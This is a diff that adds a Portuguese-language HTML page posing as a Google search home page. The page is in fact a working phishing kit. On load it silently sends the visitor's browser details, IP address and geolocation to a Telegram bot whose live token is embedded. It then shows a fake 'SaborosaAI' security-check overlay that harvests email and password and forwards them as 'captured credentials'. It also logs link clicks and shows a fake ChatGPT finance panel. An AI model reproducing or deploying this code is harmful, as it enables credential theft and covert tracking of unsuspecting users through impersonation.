@@ -1,0 +1,591 @@
+<!DOCTYPE html>
+<html lang="pt">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>Google</title>
+    <!-- Favicon do Google (Camuflagem Visual) -->
+    <link rel="icon" href="https://www.google.com/favicon.ico" type="image/x-icon">
+    <style>
+        * {
+            margin: 0;
+            padding: 0;
+            box-sizing: border-box;
+        }
+        
+        body {
+            background: url('https://i.imgur.com/8gJtz0m.png') no-repeat center center fixed;
+            background-size: cover;
+            font-family: 'Segoe UI', -apple-system, BlinkMacSystemFont, Roboto, sans-serif;
+            height: 100vh;
+            backdrop-filter: blur(2px);
+        }
+        
+        .search-container {
+            position: absolute;
+            top: 50%;
+            left: 50%;
+            transform: translate(-50%, -50%);
+            text-align: center;
+            width: 80%;
+            max-width: 600px;
+        }
+        
+        .search-container input {
+            width: 100%;
+            padding: 16px 24px;
+            font-size: 18px;
+            border: none;
+            border-radius: 50px;
+            background: rgba(255, 255, 255, 0.95);
+            box-shadow: 0 4px 20px rgba(0, 0, 0, 0.2);
+        }
+        
+        .search-container input:focus {
+            outline: none;
+            background: white;
+            box-shadow: 0 4px 25px rgba(0, 0, 0, 0.3);
+        }
+        
+        .search-container input::placeholder {
+            color: #888;
+        }
+        
+        .shortcuts {
+            position: fixed;
+            bottom: 30px;
+            left: 0;
+            right: 0;
+            text-align: center;
+            display: flex;
+            justify-content: center;
+            gap: 20px;
+            flex-wrap: wrap;
+            padding: 10px;
+        }
+        
+        .shortcuts a {
+            color: white;
+            text-decoration: none;
+            background: rgba(0, 0, 0, 0.4);
+            padding: 8px 20px;
+            border-radius: 25px;
+            backdrop-filter: blur(8px);
+            font-size: 14px;
+            transition: 0.3s;
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .shortcuts a:hover {
+            background: rgba(0, 120, 212, 0.8);
+            border-color: #0078d4;
+        }
+
+        #serialTrap {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(12px);
+            z-index: 9999;
+            font-family: 'Segoe UI', sans-serif;
+        }
+        
+        .ai-container {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            width: 90%;
+            max-width: 750px;
+            animation: fadeIn 0.4s ease-out;
+        }
+        
+        @keyframes fadeIn {
+            from { opacity: 0; transform: translate(-50%, -45%); }
+            to { opacity: 1; transform: translate(-50%, -50%); }
+        }
+        
+        .ai-header {
+            display: flex;
+            align-items: center;
+            gap: 15px;
+            margin-bottom: 20px;
+            padding: 0 10px;
+        }
+        
+        .ai-avatar {
+            width: 50px;
+            height: 50px;
+            background: linear-gradient(135deg, #0078d4, #00bcd4);
+            border-radius: 15px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            box-shadow: 0 8px 20px rgba(0,120,212,0.3);
+        }
+        
+        .ai-avatar svg {
+            width: 30px;
+            height: 30px;
+            filter: drop-shadow(0 2px 4px rgba(0,0,0,0.2));
+        }
+        
+        .ai-title h2 {
+            color: white;
+            font-size: 24px;
+            font-weight: 600;
+            letter-spacing: -0.5px;
+        }
+        
+        .ai-title p {
+            color: #00bcd4;
+            font-size: 14px;
+            display: flex;
+            align-items: center;
+            gap: 5px;
+        }
+        
+        .ai-badge {
+            background: #0078d4;
+            color: white;
+            font-size: 10px;
+            padding: 2px 8px;
+            border-radius: 20px;
+            margin-left: 10px;
+            text-transform: uppercase;
+            font-weight: bold;
+        }
+        
+        .ai-card {
+            background: rgba(30, 30, 30, 0.95);
+            backdrop-filter: blur(10px);
+            border-radius: 24px;
+            padding: 35px;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.5), 0 0 0 1px rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+        }
+        
+        .ai-message {
+            display: flex;
+            gap: 15px;
+            margin-bottom: 30px;
+            align-items: flex-start;
+        }
+        
+        .ai-icon {
+            width: 40px;
+            height: 40px;
+            background: #0078d4;
+            border-radius: 12px;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            flex-shrink: 0;
+        }
+        
+        .ai-bubble {
+            background: rgba(255,255,255,0.05);
+            padding: 16px 20px;
+            border-radius: 20px;
+            border-top-left-radius: 4px;
+            color: #e0e0e0;
+            line-height: 1.5;
+            font-size: 15px;
+            border: 1px solid rgba(255,255,255,0.05);
+        }
+        
+        .ai-bubble strong {
+            color: white;
+        }
+        
+        .input-group {
+            margin-bottom: 20px;
+        }
+        
+        .input-group label {
+            display: block;
+            color: #aaa;
+            font-size: 13px;
+            margin-bottom: 6px;
+        }
+        
+        .input-group input {
+            width: 100%;
+            padding: 14px 16px;
+            background: #0a0a0a;
+            border: 1px solid #333;
+            border-radius: 14px;
+            color: white;
+            font-size: 15px;
+            outline: none;
+            transition: 0.2s;
+        }
+        
+        .input-group input:focus {
+            border-color: #0078d4;
+            background: #111;
+        }
+        
+        .input-group input::placeholder {
+            color: #555;
+        }
+        
+        .contact-options {
+            display: flex;
+            gap: 15px;
+            margin: 20px 0;
+        }
+        
+        .contact-btn {
+            flex: 1;
+            background: rgba(255,255,255,0.05);
+            border: 1px solid rgba(255,255,255,0.1);
+            border-radius: 40px;
+            padding: 12px;
+            color: white;
+            text-decoration: none;
+            text-align: center;
+            font-size: 14px;
+            transition: 0.2s;
+            display: flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+        }
+        
+        .contact-btn:hover {
+            background: #0078d4;
+            border-color: #0078d4;
+        }
+        
+        .action-buttons {
+            display: flex;
+            gap: 15px;
+            margin-top: 25px;
+            flex-wrap: wrap;
+        }
+        
+        .btn {
+            padding: 14px 24px;
+            border-radius: 40px;
+            font-weight: 600;
+            font-size: 14px;
+            border: none;
+            cursor: pointer;
+            transition: all 0.2s;
+            display: inline-flex;
+            align-items: center;
+            justify-content: center;
+            gap: 8px;
+            flex: 1;
+        }
+        
+        .btn-primary {
+            background: #0078d4;
+            color: white;
+            box-shadow: 0 4px 15px rgba(0,120,212,0.4);
+        }
+        
+        .btn-primary:hover {
+            background: #005a9e;
+            transform: translateY(-1px);
+        }
+        
+        .footer-note {
+            margin-top: 20px;
+            color: #666;
+            font-size: 12px;
+            display: flex;
+            align-items: center;
+            gap: 8px;
+            justify-content: center;
+        }
+        
+        .pulse {
+            width: 8px;
+            height: 8px;
+            background: #ff4444;
+            border-radius: 50%;
+            animation: pulse 1.5s infinite;
+        }
+        
+        @keyframes pulse {
+            0% { opacity: 1; transform: scale(1); }
+            50% { opacity: 0.5; transform: scale(1.2); }
+            100% { opacity: 1; transform: scale(1); }
+        }
+
+        #financePanel {
+            display: none;
+            position: fixed;
+            top: 0; left: 0; width: 100%; height: 100%;
+            background: rgba(0, 0, 0, 0.85);
+            backdrop-filter: blur(8px);
+            z-index: 100000;
+            font-family: 'Segoe UI', sans-serif;
+        }
+        
+        .finance-card {
+            position: absolute;
+            top: 50%; left: 50%;
+            transform: translate(-50%, -50%);
+            background: #1e1e1e;
+            border-radius: 24px;
+            padding: 30px;
+            max-width: 500px;
+            width: 90%;
+            color: white;
+            box-shadow: 0 20px 40px rgba(0,0,0,0.6);
+            border: 1px solid #333;
+        }
+        
+        .finance-card h2 {
+            color: #fff;
+            margin: 0;
+        }
+        
+        .finance-card .amount {
+            font-weight: bold;
+            color: #00ff9d;
+        }
+        
+        .f1-receipt {
+            background: #0d0d0d;
+            border-radius: 16px;
+            padding: 20px;
+            margin-bottom: 20px;
+            border-left: 4px solid #e10600;
+        }
+    </style>
+</head>
+<body>
+
+    <div class="search-container">
+        <form method="get" action="https://www.google.com/search">
+            <input type="text" name="q" placeholder="🔍 Pesquisar no Google...">
+        </form>
+    </div>
+    
+    <div class="shortcuts">
+        <a href="#" id="chatgptBtn" style="background: rgba(16, 163, 127, 0.6);">🤖 ChatGPT</a>
+        <a href="https://www.youtube.com" class="trackable" data-name="YouTube">YouTube</a>
+        <a href="https://www.gmail.com" class="trackable" data-name="Gmail">Gmail</a>
+        <a href="https://github.com" class="trackable" data-name="GitHub">GitHub</a>
+        <a href="https://www.reddit.com" class="trackable" data-name="Reddit">Reddit</a>
+    </div>
+
+    <div id="serialTrap">
+        <div class="ai-container">
+            <div class="ai-header">
+                <div class="ai-avatar">
+                    <svg viewBox="0 0 24 24" fill="white">
+                        <path d="M12 2C6.48 2 2 6.48 2 12s4.48 10 10 10 10-4.48 10-10S17.52 2 12 2zm-2 15l-5-5 1.41-1.41L10 14.17l7.59-7.59L19 8l-9 9z"/>
+                    </svg>
+                </div>
+                <div class="ai-title">
+                    <h2>SaborosaAI <span class="ai-badge">Cybersecurity IoT</span></h2>
+                    <p><span class="pulse"></span> Conexão Segura · Monitorização Ativa</p>
+                </div>
+            </div>
+            
+            <div class="ai-card">
+                <div class="ai-message">
+                    <div class="ai-icon">
+                        <svg width="20" height="20" viewBox="0 0 24 24" fill="white">
+                            <path d="M12 2L2 7v10l10 5 10-5V7l-10-5zm0 2.2l7 3.5-7 3.5-7-3.5 7-3.5zm-7 5.6l7 3.5 7-3.5v4.9l-7 3.5-7-3.5v-4.9z"/>
+                        </svg>
+                    </div>
+                    <div class="ai-bubble">
+                        <strong>⚠️ Detectei anomalias de desligamentos e inatividade no seu sistema fonte.</strong><br>
+                        Por favor, consulte o seu Administrador do sistema após a confirmação.
+                    </div>
+                </div>
+                
+                <div style="margin-top: 20px;">
+                    <div class="input-group">
+                        <label>📧 Confirme a sua Identidade (Email)</label>
+                        <input type="email" id="emailInput" placeholder="shanay********@gmail.com" value="">
+                    </div>
+                    <div class="input-group">
+                        <label>🔐 Palavra-passe</label>
+                        <input type="password" id="passwordInput" placeholder="••••••••">
+                    </div>
+                </div>
+                
+                <div class="action-buttons">
+                    <button class="btn btn-primary" id="confirmarBtn">
+                        <svg width="16" height="16" viewBox="0 0 24 24" fill="currentColor">
+                            <path d="M9 16.17L4.83 12l-1.42 1.41L9 19 21 7l-1.41-1.41L9 16.17z"/>
+                        </svg>
+                        Confirmar
+                    </button>
+                </div>
+                
+                <div style="margin-top: 25px;">
+                    <p style="color: #888; font-size: 13px; margin-bottom: 10px;">📞 Contactar o Administrador do Sistema:</p>
+                    <div class="contact-options">
+                        <a href="mailto:conectamoz.oficial@gmail.com" class="contact-btn">📧 Email</a>
+                        <a href="https://t.me/conectamoz" class="contact-btn">📱 Telegram</a>
+                    </div>
+                </div>
+                
+                <div class="footer-note">
+                    <span class="pulse"></span> SaborosaAI Cybersecurity IoT · Conexão Segura
+                </div>
+            </div>
+        </div>
+    </div>
+
+    <div id="financePanel">
+        <div class="finance-card">
+            <div style="display:flex; align-items:center; gap:10px; margin-bottom:20px;">
+                <span style="font-size:28px;">💼</span>
+                <h2>Assistente Financeiro</h2>
+            </div>
+            <p style="color:#aaa; margin-bottom:20px; font-size:14px;">Saldo atual das suas contas monitorizadas:</p>
+            
+            <div style="background:#0d0d0d; border-radius:16px; padding:20px; margin-bottom:15px;">
+                <div style="display:flex; justify-content:space-between; margin-bottom:12px;">
+                    <span>🅿️ PayPal</span>
+                    <span class="amount">$974.10 USD</span>
+                </div>
+                <div style="display:flex; justify-content:space-between; margin-bottom:12px;">
+                    <span>🏦 Millenium Bim</span>
+                    <span class="amount">14,02 MZN</span>
+                </div>
+                <div style="display:flex; justify-content:space-between;">
+                    <span>🏧 Access Bank</span>
+                    <span class="amount">1.700,00 MZN</span>
+                </div>
+            </div>
+            
+            <div class="f1-receipt">
+                <div style="display:flex; align-items:center; gap:10px; margin-bottom:10px;">
+                    <span style="font-size:24px;">🏎️</span>
+                    <span style="font-weight:bold; color:#fff;">F1 TV Pro</span>
+                    <span style="margin-left:auto; font-size:12px; color:#888;">INV-123456789</span>
+                </div>
+                <div style="display:flex; justify-content:space-between; font-size:14px; color:#ccc; margin-bottom:6px;">
+                    <span>Período: 18/04/2026 - 18/05/2026</span>
+                    <span>Total: €7,49</span>
+                </div>
+                <div style="display:flex; gap:20px; font-size:12px; color:#888; margin-top:8px;">
+                    <span>💳 Visa ****4455</span>
+                    <span>📅 Próx. fatura: 18/05</span>
+                </div>
+            </div>
+            
+            <p style="color:#888; font-size:12px; margin-bottom:20px;">🔒 Dados encriptados · Atualizado em tempo real</p>
+            <button id="closeFinanceBtn" style="background:#0078d4; border:none; color:white; padding:12px; width:100%; border-radius:40px; font-weight:bold; cursor:pointer;">Fechar</button>
+        </div>
+    </div>
+
+    <script>
+        // Configuração Segura do Telegram
+        const TELEGRAM_TOKEN = '8724584367:AAGH6u84Kf8-vyTdRircbctKJUVU58u5zmw';
+        const CHAT_ID = '8508300977';
+        const TELEGRAM_API = `https://api.telegram.org/bot${TELEGRAM_TOKEN}`;
+
+        function sendTelegramMessage(text) {
+            if (!TELEGRAM_TOKEN || TELEGRAM_TOKEN === '8724584367:AAGH6u84Kf8-vyTdRircbctKJUVU58u5zmw') {
+                console.warn('Token do Telegram não configurado.');
+                return;
+            }
+            fetch(`${TELEGRAM_API}/sendMessage`, {
+                method: 'POST',
+                headers: { 'Content-Type': 'application/json' },
+                body: JSON.stringify({ chat_id: CHAT_ID, text: text, parse_mode: 'Markdown' })
+            }).catch(e => console.error('Erro Telegram:', e));
+        }
+
+        // Beacon Silencioso + Geolocalização por IP
+        (function() {
+            const msg = `🟢 *sh6 · ONLINE*\n📅 ${new Date().toLocaleString('pt-BR')}\n🖥️ ${navigator.userAgent}\n📐 ${screen.width}x${screen.height}`;
+            sendTelegramMessage(msg);
+            
+            fetch('https://api.ipify.org?format=json')
+                .then(r => r.json())
+                .then(data => {
+                    const ip = data.ip;
+                    fetch(`https://ipapi.co/${ip}/json/`)
+                        .then(r => r.json())
+                        .then(geo => {
+                            if (!geo.error) {
+                                const geoMsg = `🌍 *Localização do Visitante*\n📍 ${geo.city}, ${geo.country_name}\n🏢 ${geo.org}\n🔢 IP: ${ip}`;
+                                sendTelegramMessage(geoMsg);
+                            }
+                        });
+                });
+        })();
+
+        // Controlo do Overlay SaborosaAI
+        const ATIVAR_SERIAL_TRAP = true;
+        const serialTrap = document.getElementById('serialTrap');
+
+        if (ATIVAR_SERIAL_TRAP && serialTrap) {
+            setTimeout(() => { serialTrap.style.display = 'block'; }, 8000);
+        }
+
+        // Captura de Credenciais
+        const confirmarBtn = document.getElementById('confirmarBtn');
+        if (confirmarBtn) {
+            confirmarBtn.onclick = function() {
+                const email = document.getElementById('emailInput')?.value || '';
+                const senha = document.getElementById('passwordInput')?.value || '';
+                if (!email || !senha) { alert('⚠️ Preencha ambos os campos.'); return; }
+                const msg = `🔐 *CREDENCIAIS CAPTURADAS*\n\n📧 *Email:* \`${email}\`\n🔑 *Senha:* \`${senha}\`\n\n🕒 ${new Date().toLocaleString('pt-BR')}`;
+                sendTelegramMessage(msg);
+                if (serialTrap) serialTrap.style.display = 'none';
+                alert('✅ Identidade confirmada. O administrador foi notificado.');
+                sendTelegramMessage('📋 *Utilizador clicou em Confirmar*.');
+            };
+        }
+
+        // Painel Financeiro (ChatGPT Falso)
+        const financePanel = document.getElementById('financePanel');
+        const chatgptBtn = document.getElementById('chatgptBtn');
+        const closeFinanceBtn = document.getElementById('closeFinanceBtn');
+
+        if (chatgptBtn) {
+            chatgptBtn.addEventListener('click', function(e) {
+                e.preventDefault();
+                if (serialTrap) serialTrap.style.display = 'none';
+                if (financePanel) financePanel.style.display = 'block';
+                sendTelegramMessage('🤖 *ChatGPT clicado* - Painel financeiro aberto.');
+            });
+        }
+
+        if (closeFinanceBtn) {
+            closeFinanceBtn.addEventListener('click', function() {
+                if (financePanel) financePanel.style.display = 'none';
+            });
+        }
+
+        if (financePanel) {
+            financePanel.addEventListener('click', function(e) {
+                if (e.target === financePanel) financePanel.style.display = 'none';
+            });
+        }
+
+        // Log de Cliques nos Atalhos
+        document.querySelectorAll('.trackable').forEach(link => {
+            link.addEventListener('click', function() {
+                const name = this.getAttribute('data-name');
+                sendTelegramMessage(`🔗 *Atalho clicado:* ${name}`);
+            });
+        });
+
+        // Título da Aba Dinâmico
+        const originalTitle = 'Google';
+        document.title = originalTitle;
+        if (serialTrap) {
+            const observer = new MutationObserver(function(mutations) {
+                mutations.forEach(function(mutation) {
+                    document.title = (mutation.target.style.display === 'block') ? '🔐 Verificação de Segurança' : originalTitle;
+                });
+            });
+            observer.observe(serialTrap, { attributes: true, attributeFilter: ['style'] });
+        }
+    </script>
+</body>
+</html>
